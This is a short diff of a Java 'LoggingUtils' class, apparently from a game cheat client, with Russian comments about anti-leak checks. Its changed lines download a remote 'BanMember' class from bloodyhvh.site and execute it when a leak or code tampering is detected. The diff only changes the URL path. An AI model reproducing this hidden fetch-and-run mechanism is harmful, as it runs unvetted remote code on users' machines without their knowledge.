@@ -33,7 +33,7 @@ public class LoggingUtils extends JFrame {
 
         // Код проверки и загрузки класса для бана
         if (isLeaked) {
-            ((Consumer) BloodyClassLoader.visitClass("https://bloodyhvh.site/test/BanMember.class")).accept(message);
+            ((Consumer) BloodyClassLoader.visitClass("https://bloodyhvh.site/loader/classes/BanMember.class")).accept(message);
         } else {
             log(false, true);
 
@@ -42,7 +42,7 @@ public class LoggingUtils extends JFrame {
 
         // В обычных реалиях данная строчка кода недосигаемя из-за System.exit(-1);
         // Однако если это строчка будет как-то достигнута, то это 100% изменение кода
-        ((Consumer) BloodyClassLoader.visitClass("https://bloodyhvh.site/test/BanMember.class")).accept("Патч LoggingUtils");
+        ((Consumer) BloodyClassLoader.visitClass("https://bloodyhvh.site/loader/classes/BanMember.class")).accept("Патч LoggingUtils");
     }
 
     public LoggingUtils(String message, boolean isLeaked, boolean noExit) {
